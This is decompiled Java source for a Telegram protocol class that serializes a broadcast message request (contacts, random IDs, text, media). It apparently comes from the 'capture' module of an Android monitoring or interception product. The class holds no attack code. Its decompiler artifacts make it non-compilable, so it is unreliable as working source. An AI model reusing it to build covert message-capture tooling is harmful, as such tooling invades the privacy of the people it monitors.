package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$TL_messages_sendBroadcast
  extends TLObject
{
  public static int constructor = -1082919718;
  public ArrayList contacts;
  public TLRPC.InputMedia media;
  public String message;
  public ArrayList random_id;
  
  public TLRPC$TL_messages_sendBroadcast()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.contacts = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.random_id = localArrayList;
  }
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    return TLRPC.Updates.TLdeserialize(paramAbstractSerializedData, paramInt, paramBoolean);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = 481674261;
    int j = 0;
    int k = constructor;
    paramAbstractSerializedData.writeInt32(k);
    paramAbstractSerializedData.writeInt32(i);
    Object localObject = this.contacts;
    int m = ((ArrayList)localObject).size();
    paramAbstractSerializedData.writeInt32(m);
    for (int n = 0; n < m; n = k)
    {
      localObject = (TLRPC.InputUser)this.contacts.get(n);
      ((TLRPC.InputUser)localObject).serializeToStream(paramAbstractSerializedData);
      k = n + 1;
    }
    paramAbstractSerializedData.writeInt32(i);
    localObject = this.random_id;
    n = ((ArrayList)localObject).size();
    paramAbstractSerializedData.writeInt32(n);
    while (j < n)
    {
      localObject = (Long)this.random_id.get(j);
      long l = ((Long)localObject).longValue();
      paramAbstractSerializedData.writeInt64(l);
      k = j + 1;
      j = k;
    }
    localObject = this.message;
    paramAbstractSerializedData.writeString((String)localObject);
    this.media.serializeToStream(paramAbstractSerializedData);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_messages_sendBroadcast.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */